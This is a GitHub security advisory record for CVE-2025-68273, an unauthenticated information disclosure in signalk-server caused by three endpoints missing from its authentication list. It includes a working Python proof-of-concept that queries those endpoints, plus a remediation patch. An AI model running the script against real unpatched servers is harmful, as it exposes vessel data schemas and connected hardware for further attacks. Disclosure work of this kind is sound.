{
  "schema_version": "1.4.0",
  "id": "GHSA-fpf5-w967-rr2m",
  "modified": "2026-01-02T15:22:11Z",
  "published": "2026-01-02T15:22:11Z",
  "aliases": [
    "CVE-2025-68273"
  ],
  "summary": "Signal K Server Vulnerable to Unauthenticated Information Disclosure via Exposed Endpoints",
  "details": "[Note] This is a separate issue from the RCE vulnerability (State Pollution) currently being patched. While related to tokensecurity.js, it involves different endpoints and risks.\n\n### Summary\nAn unauthenticated information disclosure vulnerability allows any user to retrieve sensitive system information, including the full SignalK data schema, connected serial devices, and installed analyzer tools. This exposure facilitates reconnaissance for further attacks.\n\n### Details\nThe vulnerability stems from the fact that several sensitive API endpoints are not included in the authentication middleware's protection list in `src/tokensecurity.js`.\n\n**Vulnerable Code Analysis:**\n1.  **Missing Protection**: The `tokensecurity.js` file defines an array of paths that require authentication. However, the following paths defined in `src/serverroutes.ts` are missing from this list:\n    - `/skServer/serialports`\n    - `/skServer/availablePaths`\n    - `/skServer/hasAnalyzer`\n\n2.  **Unrestricted Access**: Because they are missing from the protection list, the `http_authorize` middleware allows access to these paths even when `enableSecurity` is set to `true`.\n\n**Exploit Scenario:**\n1.  **Reconnaissance**: An attacker scans the server for these endpoints.\n2.  **Data Extraction**:\n    - Querying `/skServer/availablePaths` returns the full JSON schema of the vessel's data (e.g., `environment.sun.sunrise`, `navigation.position`), allowing the attacker to know exactly what data points are available for targeting.\n    - Querying `/skServer/serialports` reveals connected hardware (e.g., `/dev/ttyUSB0`), aiding in physical device targeting.\n\n### PoC\nThe following Python script demonstrates the vulnerability by querying the exposed endpoints without any authentication headers.\n\n```python\nimport urllib.request\nimport json\n\nBASE_URL = \"http://localhost:3000\"\n\ndef check_endpoint(name, path):\n    url = f\"{BASE_URL}{path}\"\n    print(f\"[*] Checking {name} at {url}...\")\n    try:\n        req = urllib.request.Request(url)\n        with urllib.request.urlopen(req) as response:\n            if response.getcode() == 200:\n                print(f\"[!] VULNERABLE: {name} is accessible without authentication!\")\n                content = response.read().decode('utf-8')\n                print(f\"    Snippet: {content[:100]}...\")\n            else:\n                print(f\"[-] Secure: {response.getcode()}\")\n    except urllib.error.HTTPError as e:\n        print(f\"[-] Secure: {e.code}\")\n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n\nif __name__ == \"__main__\":\n    print(\"--- SignalK Information Disclosure PoC ---\")\n    check_endpoint(\"Serial Ports\", \"/skServer/serialports\")\n    check_endpoint(\"Available Paths\", \"/skServer/availablePaths\")\n    check_endpoint(\"Analyzer Check\", \"/skServer/hasAnalyzer\")\n```\n\n**Expected Result:**\nThe script will output `[!] VULNERABLE` for all three endpoints, showing snippets of the leaked JSON data.\n\n### Impact\n**Verified Information Disclosure**:\nDuring our verification, we successfully retrieved the following sensitive information without any authentication:\n1.  **Full Data Schema**: The `/skServer/availablePaths` endpoint returned the complete JSON schema of the vessel's data.\n    *   **Example**: `environment.sun.sunrise`, `navigation.position`\n    *   **Leakage of Internal State**: We also observed entries like `notifications.security.accessRequest.readwrite.attacker-device-32`, which revealed the presence and IDs of pending access requests (traces of our DoS attack), showing that internal server state is exposed.\n2.  **Hardware Configuration**: The `/skServer/serialports` endpoint exposed the list of connected serial devices.\n3.  **System Capabilities**: The `/skServer/hasAnalyzer` endpoint revealed whether traffic analysis tools were installed.\n\nThis information allows an attacker to map the system's internal state and capabilities, significantly facilitating further targeted attacks (Reconnaissance).\n\n---\n### Remediation\n**Update `src/tokensecurity.js`**\nAdd the missing paths to the list of protected routes in `src/tokensecurity.js`.\n\n```javascript\n// src/tokensecurity.js\n\n// ... existing protected paths ...\n;[\n  '/apps',\n  '/appstore',\n  '/plugins',\n  '/restart',\n  '/runDiscovery',\n  '/security',\n  '/vessel',\n  '/providers',\n  '/settings',\n  '/webapps',\n  '/skServer/inputTest',\n  // ADD THESE LINES:\n  '/skServer/serialports',\n  '/skServer/availablePaths',\n  '/skServer/hasAnalyzer'\n].forEach((p) =>\n  app.use(`${SERVERROUTESPREFIX}${p}`, http_authorize(false))\n)\n```",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "npm",
        "name": "signalk-server"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.19.0"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/SignalK/signalk-server/security/advisories/GHSA-fpf5-w967-rr2m"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-68273"
    },
    {
      "type": "WEB",
      "url": "https://github.com/SignalK/signalk-server/commit/ead2a03d8994969cafcca0320abee16f0e66e7a9"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/SignalK/signalk-server"
    },
    {
      "type": "WEB",
      "url": "https://github.com/SignalK/signalk-server/releases/tag/v2.19.0"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-200"
    ],
    "severity": "MODERATE",
    "github_reviewed": true,
    "github_reviewed_at": "2026-01-02T15:22:11Z",
    "nvd_published_at": "2026-01-01T19:15:53Z"
  }
}